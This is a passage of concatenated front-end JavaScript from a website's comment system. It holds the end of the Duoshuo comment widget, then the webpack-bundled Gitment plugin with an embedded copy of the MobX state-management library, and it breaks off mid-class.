                this.el.attr("id", "ds-top-users").append(this.waitingEl = i(J.waitingImg()))
            }
        }),
        J.topThreads = function(e, t) {
            return i.map(e,
            function(e) {
                return '<li><a target="_blank" href="' + p(e.url) + '" title="' + e.title + '">' + e.title + "</a>" + "</li>"
            }).join("")
        },
        H.TopThreads = R.extend({
            uri: "/api/sites/listTopThreads",
            params: "range num-items channel-key",
            tmpl: "topThreads",
            render: function() {
                this.el.children().detach(),
                this.el.attr("id", "ds-top-threads").append(this.waitingEl = i(J.waitingImg()))
            }
        }),
        J.loginWidget = function() {
            var e = '<div class="ds-icons-32">';
            return i.each(["weibo", "qq", "renren", "kaixin", "douban", "netease", "sohu"],
            function(t, n) {
                e += '<a class="ds-' + n + '" href="' + J.loginUrl(n) + '">' + w.sourceName[n] + "</a>"
            }),
            e + "</div>"
        },
        H.LoginWidget = R.extend({
            tmpl: "loginWidget",
            render: function() {
                var e = this.el;
                e.attr("id", "ds-login").html(J.loginWidget()),
                M(e, "a"),
                e.find("a.ds-logout").attr("href", J.logoutUrl())
            }
        }),
        H.ThreadCount = R.extend({
            onload: function(e) {
                var t = this.el,
                n = t.data("count-type") || "comments",
                r = e.data[n];
                t[t.data("replace") ? "replaceWith": "html"](k[n + "_" + (r ? r > 1 ? "multiple": "one": "zero")].replace("{num}", r))
            }
        });
        var yt = 0;
        w.initSelector = function(e, t) {
            var n = [];
            V() && (i.isReady || !E) && i(e).each(function(e, r) {
                var s = i(r);
                if (s.data("initialized")) return;
                s.data("initialized", !0);
                var o = new H[t.type](s, t);
                C.push(o);
                if (t.type === "ThreadCount") {
                    var u = s.attr("data-thread-key");
                    s.attr("data-channel-key") && (u = s.attr("data-channel-key") + ":" + u),
                    n.push(u),
                    st[u] || (st[u] = new et({})),
                    st[u].on("reset",
                    function() {
                        o.onload(this)
                    })
                } else if (o.uri) {
                    var a = {};
                    i.each(o.params.split(" "),
                    function(e, t) {
                        a[t.replace(/-/g, "_")] = s.attr("data-" + t) || s.data(t)
                    }),
                    L(o.uri, bt(a),
                    function(e) {
                        o.load(e)
                    })
                }
            }),
            n.length && L("/api/threads/counts", bt({
                threads: n.join(",")
            }),
            function(e) {
                l(e),
                ft(k, e.options),
                at(st, e.response)
            })
        },
        (w.initView = function() {
            i.each(N, w.initSelector)
        })(),
        i(function() {
            if (!V()) return I("\u7f3a\u5c11duoshuoQuery\u7684\u5b9a\u4e49");
            setInterval(function() {
                i(".ds-time").each(function() {
                    var e = i(this).attr("datetime");
                    e && (this.innerHTML = w.elapsedTime(e))
                })
            },
            2e4),
            z.ondomready && z.ondomready(),
            w.initView(),
            !yt && z.short_name && L("/api/analytics/ping", bt({}), l)
        })
    })
})(window, document);
var Gitment =
/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;
/******/
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// identity function for calling harmony imports with the correct context
/******/ 	__webpack_require__.i = function(value) { return value; };
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 5);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
  value: true
});
var LS_ACCESS_TOKEN_KEY = exports.LS_ACCESS_TOKEN_KEY = 'gitment-comments-token';
var LS_USER_KEY = exports.LS_USER_KEY = 'gitment-user-info';

var NOT_INITIALIZED_ERROR = exports.NOT_INITIALIZED_ERROR = new Error('Comments Not Initialized');

/***/ }),
/* 1 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(global) {

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var __extends = undefined && undefined.__extends || function () {
    var extendStatics = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (d, b) {
        d.__proto__ = b;
    } || function (d, b) {
        for (var p in b) {
            if (b.hasOwnProperty(p)) d[p] = b[p];
        }
    };
    return function (d, b) {
        extendStatics(d, b);
        function __() {
            this.constructor = d;
        }
        d.prototype = b === null ? Object.create(b) : (__.prototype = b.prototype, new __());
    };
}();
Object.defineProperty(exports, "__esModule", { value: true });
registerGlobals();
exports.extras = {
    allowStateChanges: allowStateChanges,
    deepEqual: deepEqual,
    getAtom: getAtom,
    getDebugName: getDebugName,
    getDependencyTree: getDependencyTree,
    getAdministration: getAdministration,
    getGlobalState: getGlobalState,
    getObserverTree: getObserverTree,
    isComputingDerivation: isComputingDerivation,
    isSpyEnabled: isSpyEnabled,
    onReactionError: onReactionError,
    resetGlobalState: resetGlobalState,
    shareGlobalState: shareGlobalState,
    spyReport: spyReport,
    spyReportEnd: spyReportEnd,
    spyReportStart: spyReportStart,
    setReactionScheduler: setReactionScheduler
};
if ((typeof __MOBX_DEVTOOLS_GLOBAL_HOOK__ === "undefined" ? "undefined" : _typeof(__MOBX_DEVTOOLS_GLOBAL_HOOK__)) === "object") {
    __MOBX_DEVTOOLS_GLOBAL_HOOK__.injectMobx(module.exports);
}
module.exports.default = module.exports;
var actionFieldDecorator = createClassPropertyDecorator(function (target, key, value, args, originalDescriptor) {
    var actionName = args && args.length === 1 ? args[0] : value.name || key || "<unnamed action>";
    var wrappedAction = action(actionName, value);
    addHiddenProp(target, key, wrappedAction);
}, function (key) {
    return this[key];
}, function () {
    invariant(false, getMessage("m001"));
}, false, true);
var boundActionDecorator = createClassPropertyDecorator(function (target, key, value) {
    defineBoundAction(target, key, value);
}, function (key) {
    return this[key];
}, function () {
    invariant(false, getMessage("m001"));
}, false, false);
var action = function action(arg1, arg2, arg3, arg4) {
    if (arguments.length === 1 && typeof arg1 === "function") return createAction(arg1.name || "<unnamed action>", arg1);
    if (arguments.length === 2 && typeof arg2 === "function") return createAction(arg1, arg2);
    if (arguments.length === 1 && typeof arg1 === "string") return namedActionDecorator(arg1);
    return namedActionDecorator(arg2).apply(null, arguments);
};
exports.action = action;
action.bound = function boundAction(arg1, arg2, arg3) {
    if (typeof arg1 === "function") {
        var action_1 = createAction("<not yet bound action>", arg1);
        action_1.autoBind = true;
        return action_1;
    }
    return boundActionDecorator.apply(null, arguments);
};
function namedActionDecorator(name) {
    return function (target, prop, descriptor) {
        if (descriptor && typeof descriptor.value === "function") {
            descriptor.value = createAction(name, descriptor.value);
            descriptor.enumerable = false;
            descriptor.configurable = true;
            return descriptor;
        }
        return actionFieldDecorator(name).apply(this, arguments);
    };
}
function runInAction(arg1, arg2, arg3) {
    var actionName = typeof arg1 === "string" ? arg1 : arg1.name || "<unnamed action>";
    var fn = typeof arg1 === "function" ? arg1 : arg2;
    var scope = typeof arg1 === "function" ? arg2 : arg3;
    invariant(typeof fn === "function", getMessage("m002"));
    invariant(fn.length === 0, getMessage("m003"));
    invariant(typeof actionName === "string" && actionName.length > 0, "actions should have valid names, got: '" + actionName + "'");
    return executeAction(actionName, fn, scope, undefined);
}
exports.runInAction = runInAction;
function isAction(thing) {
    return typeof thing === "function" && thing.isMobxAction === true;
}
exports.isAction = isAction;
function defineBoundAction(target, propertyName, fn) {
    var res = function res() {
        return executeAction(propertyName, fn, target, arguments);
    };
    res.isMobxAction = true;
    addHiddenProp(target, propertyName, res);
}
function autorun(arg1, arg2, arg3) {
    var name, view, scope;
    if (typeof arg1 === "string") {
        name = arg1;
        view = arg2;
        scope = arg3;
    } else {
        name = arg1.name || "Autorun@" + getNextId();
        view = arg1;
        scope = arg2;
    }
    invariant(typeof view === "function", getMessage("m004"));
    invariant(isAction(view) === false, getMessage("m005"));
    if (scope) view = view.bind(scope);
    var reaction = new Reaction(name, function () {
        this.track(reactionRunner);
    });
    function reactionRunner() {
        view(reaction);
    }
    reaction.schedule();
    return reaction.getDisposer();
}
exports.autorun = autorun;
function when(arg1, arg2, arg3, arg4) {
    var name, predicate, effect, scope;
    if (typeof arg1 === "string") {
        name = arg1;
        predicate = arg2;
        effect = arg3;
        scope = arg4;
    } else {
        name = "When@" + getNextId();
        predicate = arg1;
        effect = arg2;
        scope = arg3;
    }
    var disposer = autorun(name, function (r) {
        if (predicate.call(scope)) {
            r.dispose();
            var prevUntracked = untrackedStart();
            effect.call(scope);
            untrackedEnd(prevUntracked);
        }
    });
    return disposer;
}
exports.when = when;
function autorunAsync(arg1, arg2, arg3, arg4) {
    var name, func, delay, scope;
    if (typeof arg1 === "string") {
        name = arg1;
        func = arg2;
        delay = arg3;
        scope = arg4;
    } else {
        name = arg1.name || "AutorunAsync@" + getNextId();
        func = arg1;
        delay = arg2;
        scope = arg3;
    }
    invariant(isAction(func) === false, getMessage("m006"));
    if (delay === void 0) delay = 1;
    if (scope) func = func.bind(scope);
    var isScheduled = false;
    var r = new Reaction(name, function () {
        if (!isScheduled) {
            isScheduled = true;
            setTimeout(function () {
                isScheduled = false;
                if (!r.isDisposed) r.track(reactionRunner);
            }, delay);
        }
    });
    function reactionRunner() {
        func(r);
    }
    r.schedule();
    return r.getDisposer();
}
exports.autorunAsync = autorunAsync;
function reaction(expression, effect, arg3) {
    if (arguments.length > 3) {
        fail(getMessage("m007"));
    }
    if (isModifierDescriptor(expression)) {
        fail(getMessage("m008"));
    }
    var opts;
    if ((typeof arg3 === "undefined" ? "undefined" : _typeof(arg3)) === "object") {
        opts = arg3;
    } else {
        opts = {};
    }
    opts.name = opts.name || expression.name || effect.name || "Reaction@" + getNextId();
    opts.fireImmediately = arg3 === true || opts.fireImmediately === true;
    opts.delay = opts.delay || 0;
    opts.compareStructural = opts.compareStructural || opts.struct || false;
    effect = action(opts.name, opts.context ? effect.bind(opts.context) : effect);
    if (opts.context) {
        expression = expression.bind(opts.context);
    }
    var firstTime = true;
    var isScheduled = false;
    var nextValue;
    var r = new Reaction(opts.name, function () {
        if (firstTime || opts.delay < 1) {
            reactionRunner();
        } else if (!isScheduled) {
            isScheduled = true;
            setTimeout(function () {
                isScheduled = false;
                reactionRunner();
            }, opts.delay);
        }
    });
    function reactionRunner() {
        if (r.isDisposed) return;
        var changed = false;
        r.track(function () {
            var v = expression(r);
            changed = valueDidChange(opts.compareStructural, nextValue, v);
            nextValue = v;
        });
        if (firstTime && opts.fireImmediately) effect(nextValue, r);
        if (!firstTime && changed === true) effect(nextValue, r);
        if (firstTime) firstTime = false;
    }
    r.schedule();
    return r.getDisposer();
}
exports.reaction = reaction;
function createComputedDecorator(compareStructural) {
    return createClassPropertyDecorator(function (target, name, _, __, originalDescriptor) {
        invariant(typeof originalDescriptor !== "undefined", getMessage("m009"));
        invariant(typeof originalDescriptor.get === "function", getMessage("m010"));
        var adm = asObservableObject(target, "");
        defineComputedProperty(adm, name, originalDescriptor.get, originalDescriptor.set, compareStructural, false);
    }, function (name) {
        var observable = this.$mobx.values[name];
        if (observable === undefined) return undefined;
        return observable.get();
    }, function (name, value) {
        this.$mobx.values[name].set(value);
    }, false, false);
}
var computedDecorator = createComputedDecorator(false);
var computedStructDecorator = createComputedDecorator(true);
var computed = function computed(arg1, arg2, arg3) {
    if (typeof arg2 === "string") {
        return computedDecorator.apply(null, arguments);
    }
    invariant(typeof arg1 === "function", getMessage("m011"));
    invariant(arguments.length < 3, getMessage("m012"));
    var opts = (typeof arg2 === "undefined" ? "undefined" : _typeof(arg2)) === "object" ? arg2 : {};
    opts.setter = typeof arg2 === "function" ? arg2 : opts.setter;
    return new ComputedValue(arg1, opts.context, opts.compareStructural || opts.struct || false, opts.name || arg1.name || "", opts.setter);
};
exports.computed = computed;
computed.struct = computedStructDecorator;
function createTransformer(transformer, onCleanup) {
    invariant(typeof transformer === "function" && transformer.length < 2, "createTransformer expects a function that accepts one argument");
    var objectCache = {};
    var resetId = globalState.resetId;
    var Transformer = function (_super) {
        __extends(Transformer, _super);
        function Transformer(sourceIdentifier, sourceObject) {
            var _this = _super.call(this, function () {
                return transformer(sourceObject);
            }, undefined, false, "Transformer-" + transformer.name + "-" + sourceIdentifier, undefined) || this;
            _this.sourceIdentifier = sourceIdentifier;
            _this.sourceObject = sourceObject;
            return _this;
        }
        Transformer.prototype.onBecomeUnobserved = function () {
            var lastValue = this.value;
            _super.prototype.onBecomeUnobserved.call(this);
            delete objectCache[this.sourceIdentifier];
            if (onCleanup) onCleanup(lastValue, this.sourceObject);
        };
        return Transformer;
    }(ComputedValue);
    return function (object) {
        if (resetId !== globalState.resetId) {
            objectCache = {};
            resetId = globalState.resetId;
        }
        var identifier = getMemoizationId(object);
        var reactiveTransformer = objectCache[identifier];
        if (reactiveTransformer) return reactiveTransformer.get();
        reactiveTransformer = objectCache[identifier] = new Transformer(identifier, object);
        return reactiveTransformer.get();
    };
}
exports.createTransformer = createTransformer;
function getMemoizationId(object) {
    if (object === null || (typeof object === "undefined" ? "undefined" : _typeof(object)) !== "object") throw new Error("[mobx] transform expected some kind of object, got: " + object);
    var tid = object.$transformId;
    if (tid === undefined) {
        tid = getNextId();
        addHiddenProp(object, "$transformId", tid);
    }
    return tid;
}
function expr(expr, scope) {
    if (!isComputingDerivation()) console.warn(getMessage("m013"));
    return computed(expr, { context: scope }).get();
}
exports.expr = expr;
function extendObservable(target) {
    var properties = [];
    for (var _i = 1; _i < arguments.length; _i++) {
        properties[_i - 1] = arguments[_i];
    }
    return extendObservableHelper(target, deepEnhancer, properties);
}
exports.extendObservable = extendObservable;
function extendShallowObservable(target) {
    var properties = [];
    for (var _i = 1; _i < arguments.length; _i++) {
        properties[_i - 1] = arguments[_i];
    }
    return extendObservableHelper(target, referenceEnhancer, properties);
}
exports.extendShallowObservable = extendShallowObservable;
function extendObservableHelper(target, defaultEnhancer, properties) {
    invariant(arguments.length >= 2, getMessage("m014"));
    invariant((typeof target === "undefined" ? "undefined" : _typeof(target)) === "object", getMessage("m015"));
    invariant(!isObservableMap(target), getMessage("m016"));
    properties.forEach(function (propSet) {
        invariant((typeof propSet === "undefined" ? "undefined" : _typeof(propSet)) === "object", getMessage("m017"));
        invariant(!isObservable(propSet), getMessage("m018"));
    });
    var adm = asObservableObject(target);
    var definedProps = {};
    for (var i = properties.length - 1; i >= 0; i--) {
        var propSet = properties[i];
        for (var key in propSet) {
            if (definedProps[key] !== true && hasOwnProperty(propSet, key)) {
                definedProps[key] = true;
                if (target === propSet && !isPropertyConfigurable(target, key)) continue;
                var descriptor = Object.getOwnPropertyDescriptor(propSet, key);
                defineObservablePropertyFromDescriptor(adm, key, descriptor, defaultEnhancer);
            }
        }
    }
    return target;
}
function getDependencyTree(thing, property) {
    return nodeToDependencyTree(getAtom(thing, property));
}
function nodeToDependencyTree(node) {
    var result = {
        name: node.name
    };
    if (node.observing && node.observing.length > 0) result.dependencies = unique(node.observing).map(nodeToDependencyTree);
    return result;
}
function getObserverTree(thing, property) {
    return nodeToObserverTree(getAtom(thing, property));
}
function nodeToObserverTree(node) {
    var result = {
        name: node.name
    };
    if (hasObservers(node)) result.observers = getObservers(node).map(nodeToObserverTree);
    return result;
}
function intercept(thing, propOrHandler, handler) {
    if (typeof handler === "function") return interceptProperty(thing, propOrHandler, handler);else return interceptInterceptable(thing, propOrHandler);
}
exports.intercept = intercept;
function interceptInterceptable(thing, handler) {
    return getAdministration(thing).intercept(handler);
}
function interceptProperty(thing, property, handler) {
    return getAdministration(thing, property).intercept(handler);
}
function isComputed(value, property) {
    if (value === null || value === undefined) return false;
    if (property !== undefined) {
        if (isObservableObject(value) === false) return false;
        var atom = getAtom(value, property);
        return isComputedValue(atom);
    }
    return isComputedValue(value);
}
exports.isComputed = isComputed;
function isObservable(value, property) {
    if (value === null || value === undefined) return false;
    if (property !== undefined) {
        if (isObservableArray(value) || isObservableMap(value)) throw new Error(getMessage("m019"));else if (isObservableObject(value)) {
            var o = value.$mobx;
            return o.values && !!o.values[property];
        }
        return false;
    }
    return isObservableObject(value) || !!value.$mobx || isAtom(value) || isReaction(value) || isComputedValue(value);
}
exports.isObservable = isObservable;
var deepDecorator = createDecoratorForEnhancer(deepEnhancer);
var shallowDecorator = createDecoratorForEnhancer(shallowEnhancer);
var refDecorator = createDecoratorForEnhancer(referenceEnhancer);
var deepStructDecorator = createDecoratorForEnhancer(deepStructEnhancer);
var refStructDecorator = createDecoratorForEnhancer(refStructEnhancer);
function createObservable(v) {
    if (v === void 0) {
        v = undefined;
    }
    if (typeof arguments[1] === "string") return deepDecorator.apply(null, arguments);
    invariant(arguments.length <= 1, getMessage("m021"));
    invariant(!isModifierDescriptor(v), getMessage("m020"));
    if (isObservable(v)) return v;
    var res = deepEnhancer(v, undefined, undefined);
    if (res !== v) return res;
    return observable.box(v);
}
var IObservableFactories = function () {
    function IObservableFactories() {}
    IObservableFactories.prototype.box = function (value, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("box");
        return new ObservableValue(value, deepEnhancer, name);
    };
    IObservableFactories.prototype.shallowBox = function (value, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("shallowBox");
        return new ObservableValue(value, referenceEnhancer, name);
    };
    IObservableFactories.prototype.array = function (initialValues, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("array");
        return new ObservableArray(initialValues, deepEnhancer, name);
    };
    IObservableFactories.prototype.shallowArray = function (initialValues, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("shallowArray");
        return new ObservableArray(initialValues, referenceEnhancer, name);
    };
    IObservableFactories.prototype.map = function (initialValues, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("map");
        return new ObservableMap(initialValues, deepEnhancer, name);
    };
    IObservableFactories.prototype.shallowMap = function (initialValues, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("shallowMap");
        return new ObservableMap(initialValues, referenceEnhancer, name);
    };
    IObservableFactories.prototype.object = function (props, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("object");
        var res = {};
        asObservableObject(res, name);
        extendObservable(res, props);
        return res;
    };
    IObservableFactories.prototype.shallowObject = function (props, name) {
        if (arguments.length > 2) incorrectlyUsedAsDecorator("shallowObject");
        var res = {};
        asObservableObject(res, name);
        extendShallowObservable(res, props);
        return res;
    };
    IObservableFactories.prototype.ref = function () {
        if (arguments.length < 2) {
            return createModifierDescriptor(referenceEnhancer, arguments[0]);
        } else {
            return refDecorator.apply(null, arguments);
        }
    };
    IObservableFactories.prototype.shallow = function () {
        if (arguments.length < 2) {
            return createModifierDescriptor(shallowEnhancer, arguments[0]);
        } else {
            return shallowDecorator.apply(null, arguments);
        }
    };
    IObservableFactories.prototype.deep = function () {
        if (arguments.length < 2) {
            return createModifierDescriptor(deepEnhancer, arguments[0]);
        } else {
            return deepDecorator.apply(null, arguments);
        }
    };
    IObservableFactories.prototype.struct = function () {
        if (arguments.length < 2) {
            return createModifierDescriptor(deepStructEnhancer, arguments[0]);
        } else {
            return deepStructDecorator.apply(null, arguments);
        }
    };
    return IObservableFactories;
}();
exports.IObservableFactories = IObservableFactories;
var observable = createObservable;
exports.observable = observable;
Object.keys(IObservableFactories.prototype).forEach(function (key) {
    return observable[key] = IObservableFactories.prototype[key];
});
observable.deep.struct = observable.struct;
observable.ref.struct = function () {
    if (arguments.length < 2) {
        return createModifierDescriptor(refStructEnhancer, arguments[0]);
    } else {
        return refStructDecorator.apply(null, arguments);
    }
};
function incorrectlyUsedAsDecorator(methodName) {
    fail("Expected one or two arguments to observable." + methodName + ". Did you accidentally try to use observable." + methodName + " as decorator?");
}
function createDecoratorForEnhancer(enhancer) {
    invariant(!!enhancer, ":(");
    return createClassPropertyDecorator(function (target, name, baseValue, _, baseDescriptor) {
        assertPropertyConfigurable(target, name);
        invariant(!baseDescriptor || !baseDescriptor.get, getMessage("m022"));
        var adm = asObservableObject(target, undefined);
        defineObservableProperty(adm, name, baseValue, enhancer);
    }, function (name) {
        var observable = this.$mobx.values[name];
        if (observable === undefined) return undefined;
        return observable.get();
    }, function (name, value) {
        setPropertyValue(this, name, value);
    }, true, false);
}
function observe(thing, propOrCb, cbOrFire, fireImmediately) {
    if (typeof cbOrFire === "function") return observeObservableProperty(thing, propOrCb, cbOrFire, fireImmediately);else return observeObservable(thing, propOrCb, cbOrFire);
}
exports.observe = observe;
function observeObservable(thing, listener, fireImmediately) {
    return getAdministration(thing).observe(listener, fireImmediately);
}
function observeObservableProperty(thing, property, listener, fireImmediately) {
    return getAdministration(thing, property).observe(listener, fireImmediately);
}
function toJS(source, detectCycles, __alreadySeen) {
    if (detectCycles === void 0) {
        detectCycles = true;
    }
    if (__alreadySeen === void 0) {
        __alreadySeen = [];
    }
    function cache(value) {
        if (detectCycles) __alreadySeen.push([source, value]);
        return value;
    }
    if (isObservable(source)) {
        if (detectCycles && __alreadySeen === null) __alreadySeen = [];
        if (detectCycles && source !== null && (typeof source === "undefined" ? "undefined" : _typeof(source)) === "object") {
            for (var i = 0, l = __alreadySeen.length; i < l; i++) {
                if (__alreadySeen[i][0] === source) return __alreadySeen[i][1];
            }
        }
        if (isObservableArray(source)) {
            var res = cache([]);
            var toAdd = source.map(function (value) {
                return toJS(value, detectCycles, __alreadySeen);
            });
            res.length = toAdd.length;
            for (var i = 0, l = toAdd.length; i < l; i++) {
                res[i] = toAdd[i];
            }return res;
        }
        if (isObservableObject(source)) {
            var res = cache({});
            for (var key in source) {
                res[key] = toJS(source[key], detectCycles, __alreadySeen);
            }return res;
        }
        if (isObservableMap(source)) {
            var res_1 = cache({});
            source.forEach(function (value, key) {
                return res_1[key] = toJS(value, detectCycles, __alreadySeen);
            });
            return res_1;
        }
        if (isObservableValue(source)) return toJS(source.get(), detectCycles, __alreadySeen);
    }
    return source;
}
exports.toJS = toJS;
function transaction(action, thisArg) {
    if (thisArg === void 0) {
        thisArg = undefined;
    }
    deprecated(getMessage("m023"));
    return runInTransaction.apply(undefined, arguments);
}
exports.transaction = transaction;
function runInTransaction(action, thisArg) {
    if (thisArg === void 0) {
        thisArg = undefined;
    }
    return executeAction("", action);
}
function log(msg) {
    console.log(msg);
    return msg;
}
function whyRun(thing, prop) {
    switch (arguments.length) {
        case 0:
            thing = globalState.trackingDerivation;
            if (!thing) return log(getMessage("m024"));
            break;
        case 2:
            thing = getAtom(thing, prop);
            break;
    }
    thing = getAtom(thing);
    if (isComputedValue(thing)) return log(thing.whyRun());else if (isReaction(thing)) return log(thing.whyRun());
    return fail(getMessage("m025"));
}
exports.whyRun = whyRun;
function createAction(actionName, fn) {
    invariant(typeof fn === "function", getMessage("m026"));
    invariant(typeof actionName === "string" && actionName.length > 0, "actions should have valid names, got: '" + actionName + "'");
    var res = function res() {
        return executeAction(actionName, fn, this, arguments);
    };
    res.originalFn = fn;
    res.isMobxAction = true;
    return res;
}
function executeAction(actionName, fn, scope, args) {
    var runInfo = startAction(actionName, fn, scope, args);
    try {
        return fn.apply(scope, args);
    } finally {
        endAction(runInfo);
    }
}
function startAction(actionName, fn, scope, args) {
    var notifySpy = isSpyEnabled() && !!actionName;
    var startTime = 0;
    if (notifySpy) {
        startTime = Date.now();
        var l = args && args.length || 0;
        var flattendArgs = new Array(l);
        if (l > 0) for (var i = 0; i < l; i++) {
            flattendArgs[i] = args[i];
        }spyReportStart({
            type: "action",
            name: actionName,
            fn: fn,
            object: scope,
            arguments: flattendArgs
        });
    }
    var prevDerivation = untrackedStart();
    startBatch();
    var prevAllowStateChanges = allowStateChangesStart(true);
    return {
        prevDerivation: prevDerivation,
        prevAllowStateChanges: prevAllowStateChanges,
        notifySpy: notifySpy,
        startTime: startTime
    };
}
function endAction(runInfo) {
    allowStateChangesEnd(runInfo.prevAllowStateChanges);
    endBatch();
    untrackedEnd(runInfo.prevDerivation);
    if (runInfo.notifySpy) spyReportEnd({ time: Date.now() - runInfo.startTime });
}
function useStrict(strict) {
    invariant(globalState.trackingDerivation === null, getMessage("m028"));
    globalState.strictMode = strict;
    globalState.allowStateChanges = !strict;
}
exports.useStrict = useStrict;
function isStrictModeEnabled() {
    return globalState.strictMode;
}
exports.isStrictModeEnabled = isStrictModeEnabled;
function allowStateChanges(allowStateChanges, func) {
    var prev = allowStateChangesStart(allowStateChanges);
    var res;
    try {
        res = func();
    } finally {
        allowStateChangesEnd(prev);
    }
    return res;
}
function allowStateChangesStart(allowStateChanges) {
    var prev = globalState.allowStateChanges;
    globalState.allowStateChanges = allowStateChanges;
    return prev;
}
function allowStateChangesEnd(prev) {
    globalState.allowStateChanges = prev;
}
var BaseAtom = function () {
    function BaseAtom(name) {
        if (name === void 0) {
            name = "Atom@" + getNextId();
        }
        this.name = name;
        this.isPendingUnobservation = true;
        this.observers = [];
        this.observersIndexes = {};
        this.diffValue = 0;
        this.lastAccessedBy = 0;
        this.lowestObserverState = IDerivationState.NOT_TRACKING;
    }
    BaseAtom.prototype.onBecomeUnobserved = function () {};
    BaseAtom.prototype.reportObserved = function () {
        reportObserved(this);
    };
    BaseAtom.prototype.reportChanged = function () {
        startBatch();
        propagateChanged(this);
        endBatch();
    };
    BaseAtom.prototype.toString = function () {
        return this.name;
    };
    return BaseAtom;
}();
exports.BaseAtom = BaseAtom;
var Atom = function (_super) {
    __extends(Atom, _super);
    function Atom(name, onBecomeObservedHandler, onBecomeUnobservedHandler) {
        if (name === void 0) {
            name = "Atom@" + getNextId();
        }
        if (onBecomeObservedHandler === void 0) {
            onBecomeObservedHandler = noop;
        }
        if (onBecomeUnobservedHandler === void 0) {
            onBecomeUnobservedHandler = noop;
        }
        var _this = _super.call(this, name) || this;
        _this.name = name;
        _this.onBecomeObservedHandler = onBecomeObservedHandler;
        _this.onBecomeUnobservedHandler = onBecomeUnobservedHandler;
        _this.isPendingUnobservation = false;
        _this.isBeingTracked = false;
        return _this;
    }
    Atom.prototype.reportObserved = function () {
        startBatch();
        _super.prototype.reportObserved.call(this);
        if (!this.isBeingTracked) {
            this.isBeingTracked = true;
            this.onBecomeObservedHandler();
        }
        endBatch();
        return !!globalState.trackingDerivation;
    };
    Atom.prototype.onBecomeUnobserved = function () {
        this.isBeingTracked = false;
        this.onBecomeUnobservedHandler();
    };
    return Atom;
}(BaseAtom);
exports.Atom = Atom;
var isAtom = createInstanceofPredicate("Atom", BaseAtom);
var ComputedValue = function () {
    function ComputedValue(derivation, scope, compareStructural, name, setter) {
        this.derivation = derivation;
        this.scope = scope;
        this.compareStructural = compareStructural;
        this.dependenciesState = IDerivationState.NOT_TRACKING;
        this.observing = [];
        this.newObserving = null;
        this.isPendingUnobservation = false;
        this.observers = [];
        this.observersIndexes = {};
        this.diffValue = 0;
        this.runId = 0;
        this.lastAccessedBy = 0;
        this.lowestObserverState = IDerivationState.UP_TO_DATE;
        this.unboundDepsCount = 0;
        this.__mapid = "#" + getNextId();
        this.value = undefined;
        this.isComputing = false;
        this.isRunningSetter = false;
        this.name = name || "ComputedValue@" + getNextId();
        if (setter) this.setter = createAction(name + "-setter", setter);
    }
    ComputedValue.prototype.onBecomeStale = function () {
        propagateMaybeChanged(this);
    };
    ComputedValue.prototype.onBecomeUnobserved = function () {
        invariant(this.dependenciesState !== IDerivationState.NOT_TRACKING, getMessage("m029"));
        clearObserving(this);
        this.value = undefined;
    };
    ComputedValue.prototype.get = function () {
        invariant(!this.isComputing, "Cycle detected in computation " + this.name, this.derivation);
        if (globalState.inBatch === 0) {
            startBatch();
            if (shouldCompute(this)) this.value = this.computeValue(false);
            endBatch();
        } else {
            reportObserved(this);
            if (shouldCompute(this)) if (this.trackAndCompute()) propagateChangeConfirmed(this);
        }
        var result = this.value;
        if (isCaughtException(result)) throw result.cause;
        return result;
    };
    ComputedValue.prototype.peek = function () {
        var res = this.computeValue(false);
        if (isCaughtException(res)) throw res.cause;
        return res;
    };
    ComputedValue.prototype.set = function (value) {
        if (this.setter) {
            invariant(!this.isRunningSetter, "The setter of computed value '" + this.name + "' is trying to update itself. Did you intend to update an _observable_ value, instead of the computed property?");
            this.isRunningSetter = true;
            try {
                this.setter.call(this.scope, value);
            } finally {
                this.isRunningSetter = false;
            }
        } else invariant(false, "[ComputedValue '" + this.name + "'] It is not possible to assign a new value to a computed value.");
    };
